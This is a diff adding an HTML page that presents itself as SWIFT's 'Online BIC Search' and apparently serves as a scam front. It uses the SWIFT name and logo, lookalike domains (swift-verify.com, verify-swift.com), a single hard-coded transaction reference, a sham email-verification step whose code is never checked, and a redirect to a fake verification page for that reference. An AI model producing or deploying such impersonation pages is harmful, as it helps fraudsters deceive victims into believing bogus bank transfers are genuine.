@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Online BIC Search</title>
+  <style>
+    body { 
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; 
+      margin: 0; 
+      padding: 0; 
+      background-color: #fff; 
+    }
+    header { 
+      padding: 20px; 
+      background-color: white; 
+      display: flex; 
+      flex-wrap: wrap; 
+      align-items: center; 
+      justify-content: space-between; 
+      border-bottom: 1px solid #e0e0e0; 
+    }
+    .logo img { 
+      height: 40px; 
+    }
+    .menu-toggle { 
+      display: none; 
+      font-size: 30px; 
+      background: none; 
+      border: none; 
+      cursor: pointer; 
+      margin-left: auto; 
+      margin-right: 20px; 
+    }
+    nav { 
+      display: flex; 
+      gap: 10px; 
+      flex-wrap: wrap; 
+      justify-content: flex-end; 
+      margin-top: 10px; 
+    }
+    nav a { 
+      text-decoration: none; 
+      color: #333; 
+      font-size: 14px; 
+    }
+    .hero { 
+      height: 300px; 
+      background-image: url('https://swift-verify.com/images/bic-search-banner.jpg'); 
+      background-size: cover; 
+      background-position: center; 
+      display: flex; 
+      align-items: center; 
+      justify-content: center; 
+      color: white; 
+      text-align: center; 
+    }
+    .hero h1 { 
+      font-size: 48px; 
+      margin: 0; 
+      padding: 0 20px; 
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5); 
+    }
+    .content { 
+      max-width: 800px; 
+      margin: 40px auto; 
+      padding: 0 20px; 
+      color: #333; 
+      text-align: center;
+    }
+    .open-modal-btn {
+      background-color: #a7f2e0;
+      color: #000;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .open-modal-btn:hover {
+      background-color: #8de0ce;
+    }
+    
+    /* Modal Styles */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-content {
+      background-color: white;
+      padding: 30px;
+      border-radius: 8px;
+      width: 90%;
+      max-width: 500px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    }
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    .modal-title {
+      font-size: 20px;
+      font-weight: bold;
+      margin: 0;
+    }
+    .close-btn {
+      background: none;
+      border: none;
+      font-size: 24px;
+      cursor: pointer;
+      color: #777;
+    }
+    .form-group { 
+      margin-top: 20px; 
+      text-align: left;
+    }
+    label { 
+      display: block; 
+      font-weight: bold; 
+      margin-bottom: 5px; 
+    }
+    input { 
+      width: 100%; 
+      padding: 12px; 
+      border: 1px solid #ccc; 
+      border-radius: 6px; 
+      box-sizing: border-box; 
+    }
+    .form-actions { 
+      margin-top: 30px; 
+      display: flex; 
+      gap: 10px; 
+      flex-wrap: wrap; 
+    }
+    .form-actions button { 
+      flex: 1; 
+      padding: 12px; 
+      font-size: 16px; 
+      border: none; 
+      border-radius: 6px; 
+      cursor: pointer; 
+      min-width: 120px; 
+    }
+    .next-btn { 
+      background-color: #a7f2e0; 
+      color: #000; 
+    }
+    .next-btn:hover { 
+      background-color: #8de0ce; 
+    }
+    .back-btn { 
+      background-color: #f0f0f0; 
+    }
+    .back-btn:hover { 
+      background-color: #e0e0e0; 
+    }
+    #not-found { 
+      display: none; 
+      margin-top: 20px; 
+      color: red; 
+      font-weight: bold; 
+      text-align: center; 
+      padding: 10px; 
+      background-color: #ffeeee; 
+      border-radius: 4px; 
+    }
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .step {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background-color: #e0e0e0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 10px;
+      font-weight: bold;
+    }
+    .step.active {
+      background-color: #a7f2e0;
+    }
+    .step-line {
+      width: 40px;
+      height: 2px;
+      background-color: #e0e0e0;
+      margin-top: 14px;
+    }
+    
+    @media (max-width: 768px) { 
+      nav { 
+        display: none; 
+        flex-direction: column; 
+        width: 100%; 
+        text-align: center; 
+        background: white; 
+        margin-top: 10px; 
+        padding: 10px 0; 
+        border-top: 1px solid #eee; 
+      } 
+      nav.show { 
+        display: flex; 
+      } 
+      .menu-toggle { 
+        display: block; 
+      } 
+      .hero h1 { 
+        font-size: 32px; 
+      } 
+      .modal-content {
+        width: 95%;
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+<header>
+  <div class="logo">
+    <img src="DATA_URL_HERE" alt="Swift Logo">
+  </div>
+  <button class="menu-toggle" onclick="toggleMenu()">☰</button>
+  <nav id="navbar">
+    <a href="https://swift-verify.com/about-us.html">About us</a>
+    <a href="https://swift-verify.com/your-needs.html">Your needs</a>
+    <a href="https://swift-verify.com/our-solutions.html">Our solutions</a>
+    <a href="https://swift-verify.com/standards.html">Standards</a>
+    <a href="https://swift-verify.com/news-events.html">News & Events</a>
+    <a href="https://swift-verify.com/news-events.html">Press</a>
+    <a href="https://swift-verify.com/join-swift.html">Join Swift</a>
+    <a href="https://swift-verify.com/contact-us.html">Contact us</a>
+  </nav>
+</header>
+
+<div class="hero">
+  <h1>Online BIC Search</h1>
+</div>
+
+<div class="content">
+  <p>Click the button below to search for your transaction details using your reference number.</p>
+  <button class="open-modal-btn" id="openModalBtn">Start Search</button>
+</div>
+
+<!-- Modal for reference input and email verification -->
+<div class="modal" id="searchModal">
+  <div class="modal-content">
+    <div class="modal-header">
+      <h2 class="modal-title">Transaction Search</h2>
+      <button class="close-btn" id="closeModalBtn">&times;</button>
+    </div>
+    
+    <!-- Step Indicator -->
+    <div class="step-indicator">
+      <div class="step active" id="step1">1</div>
+      <div class="step-line"></div>
+      <div class="step" id="step2">2</div>
+    </div>
+    
+    <!-- Step 1: Reference Number -->
+    <div class="step-content" id="step1Content">
+      <p>Enter the reference number to search for your transaction details.</p>
+      
+      <div class="form-group">
+        <label for="ref">Reference number</label>
+        <input type="text" id="ref" placeholder="Enter reference number" />
+      </div>
+
+      <div class="form-actions">
+        <button class="next-btn" id="nextToEmailBtn">Next</button>
+      </div>
+
+      <div id="not-found">No matching records found. Please check your reference number.</div>
+    </div>
+    
+    <!-- Step 2: Email Verification -->
+    <div class="step-content" id="step2Content" style="display: none;">
+      <p>Please enter your email address to receive a verification code.</p>
+      
+      <div class="form-group">
+        <label for="email">Email address</label>
+        <input type="email" id="email" placeholder="Enter your email" />
+      </div>
+
+      <div class="form-actions">
+        <button class="back-btn" id="backToRefBtn">Back</button>
+        <button class="next-btn" id="sendCodeBtn">Send Code</button>
+      </div>
+    </div>
+    
+    <!-- Step 3: Verification Code -->
+    <div class="step-content" id="step3Content" style="display: none;">
+      <p>We've sent a 6-digit verification code to your email. Please enter it below.</p>
+      
+      <div class="form-group">
+        <label for="verificationCode">Verification code</label>
+        <input type="text" id="verificationCode" placeholder="Enter 6-digit code" maxlength="6" />
+      </div>
+
+      <div class="form-actions">
+        <button class="back-btn" id="backToEmailBtn">Back</button>
+        <button class="next-btn" id="verifyCodeBtn">Verify</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // Menu toggle function
+  function toggleMenu() {
+    const nav = document.getElementById('navbar');
+    nav.classList.toggle('show');
+  }
+
+  // Modal functionality
+  const modal = document.getElementById('searchModal');
+  const openModalBtn = document.getElementById('openModalBtn');
+  const closeModalBtn = document.getElementById('closeModalBtn');
+  
+  // Step navigation elements
+  const step1Content = document.getElementById('step1Content');
+  const step2Content = document.getElementById('step2Content');
+  const step3Content = document.getElementById('step3Content');
+  const step1 = document.getElementById('step1');
+  const step2 = document.getElementById('step2');
+  
+  // Buttons
+  const nextToEmailBtn = document.getElementById('nextToEmailBtn');
+  const backToRefBtn = document.getElementById('backToRefBtn');
+  const sendCodeBtn = document.getElementById('sendCodeBtn');
+  const backToEmailBtn = document.getElementById('backToEmailBtn');
+  const verifyCodeBtn = document.getElementById('verifyCodeBtn');
+  
+  // Input fields
+  const refInput = document.getElementById('ref');
+  const emailInput = document.getElementById('email');
+  const codeInput = document.getElementById('verificationCode');
+  
+  // Error message
+  const notFoundEl = document.getElementById('not-found');
+  
+  // Open modal
+  openModalBtn.addEventListener('click', function() {
+    modal.style.display = 'flex';
+    resetForm();
+  });
+  
+  // Close modal
+  closeModalBtn.addEventListener('click', function() {
+    modal.style.display = 'none';
+  });
+  
+  // Close modal when clicking outside
+  window.addEventListener('click', function(event) {
+    if (event.target === modal) {
+      modal.style.display = 'none';
+    }
+  });
+  
+  // Next to email step
+  nextToEmailBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    const ref = refInput.value.trim();
+    
+    if (ref === "COBA300525CH59279") {
+      notFoundEl.style.display = "none";
+      // Show step 2
+      step1Content.style.display = "none";
+      step2Content.style.display = "block";
+      step1.classList.remove('active');
+      step2.classList.add('active');
+    } else {
+      notFoundEl.style.display = "block";
+    }
+  });
+  
+  // Back to reference step
+  backToRefBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    step2Content.style.display = "none";
+    step1Content.style.display = "block";
+    step2.classList.remove('active');
+    step1.classList.add('active');
+  });
+  
+  // Send verification code
+  sendCodeBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    const email = emailInput.value.trim();
+    
+    if (email && isValidEmail(email)) {
+      // In a real application, you would send the code to the email here
+      // For demo purposes, we'll just show the next step
+      step2Content.style.display = "none";
+      step3Content.style.display = "block";
+      
+      // Generate and log a random 6-digit code (for demo purposes)
+      const verificationCode = Math.floor(100000 + Math.random() * 900000);
+      console.log(`Verification code for ${email}: ${verificationCode}`);
+      alert(`Demo: A verification code has been sent to ${email}. Check the browser console for the code.`);
+    } else {
+      alert("Please enter a valid email address.");
+    }
+  });
+  
+  // Back to email step
+  backToEmailBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    step3Content.style.display = "none";
+    step2Content.style.display = "block";
+  });
+  
+  // Verify code and redirect
+  verifyCodeBtn.addEventListener('click', function(e) {
+    e.preventDefault();
+    const code = codeInput.value.trim();
+    
+    if (code.length === 6) {
+      // In a real application, you would verify the code here
+      // For demo purposes, we'll just redirect
+      window.location.href = "https://verify-swift.com/checkswift/verification/COBA300525CH59279/BD10556814.html";
+    } else {
+      alert("Please enter a valid 6-digit code.");
+    }
+  });
+  
+  // Helper function to validate email
+  function isValidEmail(email) {
+    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return re.test(email);
+  }
+  
+  // Reset form to initial state
+  function resetForm() {
+    step1Content.style.display = "block";
+    step2Content.style.display = "none";
+    step3Content.style.display = "none";
+    step1.classList.add('active');
+    step2.classList.remove('active');
+    refInput.value = '';
+    emailInput.value = '';
+    codeInput.value = '';
+    notFoundEl.style.display = "none";
+  }
+</script>
+
+</body>
+</html>
